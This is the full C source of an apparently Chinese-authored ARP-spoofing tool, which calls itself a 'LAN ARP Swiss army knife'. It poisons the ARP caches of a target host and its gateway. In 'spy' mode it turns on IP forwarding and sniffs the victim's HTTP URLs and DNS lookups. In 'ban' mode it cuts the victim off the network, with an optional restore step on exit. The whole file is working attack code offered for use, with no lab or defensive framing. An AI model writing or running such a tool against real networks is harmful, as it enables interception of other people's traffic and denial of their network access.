#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pcap.h>
#include <netinet/if_ether.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <signal.h>
#include <time.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <pthread.h>
#include <glib.h>
#include <locale.h>

#define VERSION "3.1-GLib"

// 协议头定义
struct arp_header {
    uint16_t htype;
    uint16_t ptype;
    uint8_t  hlen;
    uint8_t  plen;
    uint16_t opcode;
    uint8_t  sender_mac[6];
    uint8_t  sender_ip[4];
    uint8_t  target_mac[6];
    uint8_t  target_ip[4];
};

struct eth_header {
    uint8_t  dst_mac[6];
    uint8_t  src_mac[6];
    uint16_t ether_type;
};

struct dns_header {
    uint16_t id;
    uint16_t flags;
    uint16_t q_count;
    uint16_t ans_count;
    uint16_t auth_count;
    uint16_t add_count;
};

// 全局配置 (使用 GLib 类型或标准类型)
int running = 1;
char *interface = NULL;
uint8_t my_mac[6];
uint8_t my_ip[4];
uint8_t target_mac[6];
uint8_t gateway_mac[6];
uint8_t target_ip[4];
uint8_t gateway_ip[4];

// 参数变量
static gchar *opt_target = NULL;
static gchar *opt_gateway = NULL;
static gchar *opt_iface = NULL;
static gboolean opt_spy = FALSE;
static gboolean opt_verbose = FALSE;
static gboolean opt_restore = FALSE;
static gint opt_interval = 100;

void signal_handler(int sig) {
    running = 0;
}

// 获取网卡信息
int get_local_info(const char *iface, uint8_t *mac, uint8_t *ip) {
    int fd;
    struct ifreq ifr;
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    
    strncpy(ifr.ifr_name, iface, IFNAMSIZ-1);
    
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) { close(fd); return -1; }
    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);

    if (ioctl(fd, SIOCGIFADDR, &ifr) < 0) { close(fd); return -1; }
    memcpy(ip, &((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr, 4);
    
    close(fd);
    return 0;
}

// 发送 ARP 包
void send_arp(pcap_t *handle, 
              const uint8_t *src_mac, const uint8_t *src_ip,
              const uint8_t *dst_mac, const uint8_t *dst_ip,
              uint16_t opcode) {
    uint8_t packet[60];
    memset(packet, 0, 60);
    struct eth_header *eth = (struct eth_header *)packet;
    struct arp_header *arp = (struct arp_header *)(packet + sizeof(struct eth_header));
    
    memcpy(eth->dst_mac, dst_mac, 6);
    memcpy(eth->src_mac, src_mac, 6);
    eth->ether_type = htons(ETHERTYPE_ARP);
    
    arp->htype = htons(1);
    arp->ptype = htons(ETHERTYPE_IP);
    arp->hlen = 6;
    arp->plen = 4;
    arp->opcode = htons(opcode);
    
    memcpy(arp->sender_mac, src_mac, 6);
    memcpy(arp->sender_ip, src_ip, 4);
    memcpy(arp->target_mac, dst_mac, 6);
    memcpy(arp->target_ip, dst_ip, 4);
    
    pcap_sendpacket(handle, packet, 60);
}

// 解析 MAC 地址
int resolve_mac(pcap_t *handle, const uint8_t *ip, uint8_t *mac_out) {
    uint8_t broadcast[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    struct pcap_pkthdr *header;
    const u_char *pkt_data;
    time_t start = time(NULL);

    send_arp(handle, my_mac, my_ip, broadcast, ip, 1);

    while (time(NULL) - start < 2 && running) {
        int res = pcap_next_ex(handle, &header, &pkt_data);
        if (res == 1) {
            struct eth_header *eth = (struct eth_header *)pkt_data;
            if (ntohs(eth->ether_type) == ETHERTYPE_ARP) {
                struct arp_header *arp = (struct arp_header *)(pkt_data + sizeof(struct eth_header));
                if (ntohs(arp->opcode) == 2 && memcmp(arp->sender_ip, ip, 4) == 0) {
                    memcpy(mac_out, arp->sender_mac, 6);
                    return 0;
                }
            }
        }
    }
    return -1;
}

// HTTP 解析
void parse_http(const u_char *payload, int len) {
    if (len < 10) return;
    if (memcmp(payload, "GET ", 4) == 0 || memcmp(payload, "POST ", 5) == 0) {
        char *line_end = memchr(payload, '\n', len);
        if (!line_end) return;
        
        int first_line_len = line_end - (char*)payload;
        char url_path[256] = {0};
        int method_len = (payload[0] == 'G') ? 4 : 5;
        
        int path_len = 0;
        for (int i = method_len; i < first_line_len; i++) {
            if (payload[i] == ' ') break;
            if (path_len < 255) url_path[path_len++] = payload[i];
        }
        
        const char *host_ptr = strstr((const char*)payload, "Host: ");
        char host[256] = {0};
        if (host_ptr) {
            host_ptr += 6;
            int h_len = 0;
            while (*host_ptr != '\r' && *host_ptr != '\n' && h_len < 255) {
                host[h_len++] = *host_ptr++;
            }
        }
        printf("[HTTP] http://%s%s\n", host, url_path);
    }
}

// DNS 解析
void parse_dns(const u_char *payload, int len) {
    if (len < sizeof(struct dns_header)) return;
    const u_char *qname = payload + 12;
    if (qname >= payload + len) return;

    char domain[256] = {0};
    int d_len = 0;
    int i = 0;
    
    while (qname[i] != 0 && (qname + i) < (payload + len)) {
        int label_len = qname[i];
        if (d_len > 0 && d_len < 255) domain[d_len++] = '.';
        i++;
        for (int j = 0; j < label_len; j++) {
            if (i >= len) return;
            if (d_len < 255) domain[d_len++] = qname[i++];
        }
    }
    if (d_len > 0) printf("[DNS] 查询: %s\n", domain);
}

// 嗅探回调
void packet_handler(u_char *user, const struct pcap_pkthdr *pkthdr, const u_char *packet) {
    struct eth_header *eth = (struct eth_header *)packet;
    if (ntohs(eth->ether_type) != ETHERTYPE_IP) return;
    
    struct ip *iph = (struct ip *)(packet + sizeof(struct eth_header));
    int ip_header_len = iph->ip_hl * 4;
    
    if (memcmp(&iph->ip_src, target_ip, 4) != 0 && memcmp(&iph->ip_dst, target_ip, 4) != 0) return;

    if (iph->ip_p == IPPROTO_TCP) {
        struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct eth_header) + ip_header_len);
        int tcp_header_len = tcph->th_off * 4;
        u_char *payload = (u_char *)(packet + sizeof(struct eth_header) + ip_header_len + tcp_header_len);
        int payload_len = pkthdr->len - (sizeof(struct eth_header) + ip_header_len + tcp_header_len);
        if (payload_len > 0 && (ntohs(tcph->th_dport) == 80 || ntohs(tcph->th_sport) == 80)) parse_http(payload, payload_len);
    } else if (iph->ip_p == IPPROTO_UDP) {
        struct udphdr *udph = (struct udphdr *)(packet + sizeof(struct eth_header) + ip_header_len);
        u_char *payload = (u_char *)(packet + sizeof(struct eth_header) + ip_header_len + sizeof(struct udphdr));
        int payload_len = pkthdr->len - (sizeof(struct eth_header) + ip_header_len + sizeof(struct udphdr));
        if (ntohs(udph->uh_dport) == 53) parse_dns(payload, payload_len);
    }
}

// 攻击线程
void *arp_poison_thread(void *arg) {
    pcap_t *handle = (pcap_t *)arg;
    uint8_t spoof_mac[6]; 
    if (opt_spy) memcpy(spoof_mac, my_mac, 6);
    else for(int i=0; i<6; i++) spoof_mac[i] = rand() % 255;

    printf("[Thread] 攻击线程启动...\n");
    long long count = 0;
    while (running) {
        // 1. 欺骗目标：网关在这里 (spoof_mac)
        send_arp(handle, spoof_mac, gateway_ip, target_mac, target_ip, 2);
        
        // 2. 欺骗网关：目标在这里 (spoof_mac)
        // 无论是在监听模式(转发)还是断网模式(丢包)，都进行双向欺骗
        send_arp(handle, spoof_mac, target_ip, gateway_mac, gateway_ip, 2);
        
        count++;
        if (opt_verbose || (count % 20 == 0)) {
            printf("[*] 正在攻击... 已发送 %lld 轮欺骗包\n", count);
        }
        usleep(opt_interval * 1000); // 毫秒转微秒
    }
    
    if (opt_restore) {
        printf("[Thread] 正在恢复网络 (Re-ARP)...\n");
        for(int i=0; i<3; i++) {
            send_arp(handle, gateway_mac, gateway_ip, target_mac, target_ip, 2);
            send_arp(handle, target_mac, target_ip, gateway_mac, gateway_ip, 2);
            usleep(100000);
        }
        printf("[Thread] 网络已恢复。\n");
    } else {
        printf("[Thread] 攻击结束 (未执行恢复，目标可能持续断网一段时间)。\n");
    }
    return NULL;
}

// 获取网关
char* get_default_gateway_str() {
    FILE *fp = fopen("/proc/net/route", "r");
    if (!fp) return NULL;
    static char gw[16];
    char line[256], iface[16];
    unsigned long dest, gateway;
    while (fgets(line, sizeof(line), fp)) {
        if (sscanf(line, "%s %lx %lx", iface, &dest, &gateway) == 3 && dest == 0) {
            struct in_addr addr; addr.s_addr = gateway;
            strcpy(gw, inet_ntoa(addr));
            fclose(fp); return gw;
        }
    }
    fclose(fp); return NULL;
}

// 智能查找网卡
char* find_best_interface(const char *target_ip_str) {
    pcap_if_t *alldevs;
    char errbuf[PCAP_ERRBUF_SIZE];
    uint32_t target_ip_n;
    if (inet_pton(AF_INET, target_ip_str, &target_ip_n) != 1) return NULL;
    if (pcap_findalldevs(&alldevs, errbuf) == -1) return NULL;
    
    pcap_if_t *d;
    pcap_addr_t *a;
    char *best_iface = NULL;

    for (d = alldevs; d; d = d->next) {
        for (a = d->addresses; a; a = a->next) {
            if (a->addr->sa_family == AF_INET && a->netmask) {
                uint32_t if_ip = ((struct sockaddr_in*)a->addr)->sin_addr.s_addr;
                uint32_t netmask = ((struct sockaddr_in*)a->netmask)->sin_addr.s_addr;
                if ((target_ip_n & netmask) == (if_ip & netmask)) {
                    best_iface = g_strdup(d->name);
                    goto found;
                }
            }
        }
    }
found:
    pcap_freealldevs(alldevs);
    return best_iface;
}

// GOptionEntry 定义
static GOptionEntry entries[] = {
    { "target", 't', 0, G_OPTION_ARG_STRING, &opt_target, "目标 IP 地址 (必须)", "IP" },
    { "gateway", 'g', 0, G_OPTION_ARG_STRING, &opt_gateway, "网关 IP 地址 (默认自动获取)", "IP" },
    { "interface", 'i', 0, G_OPTION_ARG_STRING, &opt_iface, "指定网络接口 (如 eth0, enp3s0)", "IFACE" },
    { "spy", 'm', 0, G_OPTION_ARG_NONE, &opt_spy, "开启中间人监听模式 (默认是断网模式)", NULL },
    { "verbose", 'v', 0, G_OPTION_ARG_NONE, &opt_verbose, "显示详细发送日志", NULL },
    { "restore", 'r', 0, G_OPTION_ARG_NONE, &opt_restore, "退出时尝试恢复目标网络 (Re-ARP)", NULL },
    { "interval", 's', 0, G_OPTION_ARG_INT, &opt_interval, "发送心跳包的时间间隔 (毫秒, 默认 100)", "MS" },
    { NULL }
};

int main(int argc, char *argv[]) {
    // 初始化本地化设置，以支持中文显示
    setlocale(LC_ALL, "");

    if (getuid() != 0) { fprintf(stderr, "错误: 需要 root 权限运行此程序。\n"); return 1; }
    srand(time(NULL));

    // 使用 GOptionContext 解析参数
    GError *error = NULL;
    GOptionContext *context;

    context = g_option_context_new("- 局域网 ARP 瑞士军刀");
    g_option_context_add_main_entries(context, entries, NULL);
    if (!g_option_context_parse(context, &argc, &argv, &error)) {
        fprintf(stderr, "参数解析失败: %s\n", error->message);
        g_error_free(error);
        g_option_context_free(context);
        return 1;
    }
    g_option_context_free(context);

    if (!opt_target) {
        fprintf(stderr, "错误: 必须使用 -t 指定目标 IP。使用 --help 查看用法。\n");
        return 1;
    }
    
    // 1. 初始化网卡 (智能选择)
    if (!opt_iface) {
        opt_iface = find_best_interface(opt_target);
        if (opt_iface) printf("[*] 自动匹配同网段网卡: %s\n", opt_iface);
        else {
            pcap_if_t *alldevs; char errbuf[PCAP_ERRBUF_SIZE];
            if (pcap_findalldevs(&alldevs, errbuf) != -1) {
                 for(pcap_if_t *d=alldevs; d; d=d->next) 
                     if (strcmp(d->name, "lo")!=0) { opt_iface = g_strdup(d->name); break; }
                 pcap_freealldevs(alldevs);
            }
            if (opt_iface) printf("[*] 未找到同网段网卡，默认使用: %s\n", opt_iface);
        }
    }
    if (!opt_iface) { fprintf(stderr, "未找到网卡\n"); return 1; }

    // 2. 获取本机信息
    if (get_local_info(opt_iface, my_mac, my_ip) < 0) {
        fprintf(stderr, "无法获取网卡 %s 信息\n", opt_iface);
        return 1;
    }

    // 3. 处理 IP
    if (!opt_gateway) opt_gateway = get_default_gateway_str();
    if (!opt_gateway) { fprintf(stderr, "找不到默认网关\n"); return 1; }
    
    inet_pton(AF_INET, opt_target, target_ip);
    inet_pton(AF_INET, opt_gateway, gateway_ip);

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(opt_iface, 65535, 1, 100, errbuf);
    if (!handle) { fprintf(stderr, "Pcap error: %s\n", errbuf); return 1; }

    // 4. 解析 MAC
    printf("[*] 正在解析 MAC 地址...\n");
    if (resolve_mac(handle, target_ip, target_mac) < 0) {
        fprintf(stderr, "无法获取目标 MAC (目标可能离线或防火墙拦截)\n");
        return 1;
    }
    printf("    目标: %s [%02x:%02x:%02x:%02x:%02x:%02x]\n", 
           opt_target, target_mac[0], target_mac[1], target_mac[2], target_mac[3], target_mac[4], target_mac[5]);

    if (resolve_mac(handle, gateway_ip, gateway_mac) < 0) {
        fprintf(stderr, "无法获取网关 MAC\n");
        return 1;
    }
    printf("    网关: %s [%02x:%02x:%02x:%02x:%02x:%02x]\n", 
           opt_gateway, gateway_mac[0], gateway_mac[1], gateway_mac[2], gateway_mac[3], gateway_mac[4], gateway_mac[5]);

    // 5. 模式逻辑
    if (opt_spy) {
        printf("\n[!] 监听模式启动 (Spy Mode)\n");
        printf("    [*] 开启内核 IP 转发...\n");
        system("sysctl -w net.ipv4.ip_forward=1 > /dev/null");
    } else {
        printf("\n[!] 断网模式启动 (Ban Mode)\n");
        printf("    [*] 强制关闭内核 IP 转发 (防止意外转发流量)...\n");
        system("sysctl -w net.ipv4.ip_forward=0 > /dev/null");
    }

    signal(SIGINT, signal_handler);
    pthread_t th;
    pthread_create(&th, NULL, arp_poison_thread, (void*)handle);

    if (opt_spy) {
        printf("[*] 正在嗅探 HTTP/DNS 流量...\n");
        pcap_loop(handle, -1, packet_handler, NULL);
    } else {
        printf("[*] 正在执行断网攻击... 按 Ctrl+C 停止\n");
        while(running) sleep(1);
    }

    pthread_join(th, NULL);
    pcap_close(handle);
    if (opt_spy) system("sysctl -w net.ipv4.ip_forward=0 > /dev/null");
    printf("[*] 程序结束\n");
    return 0;
}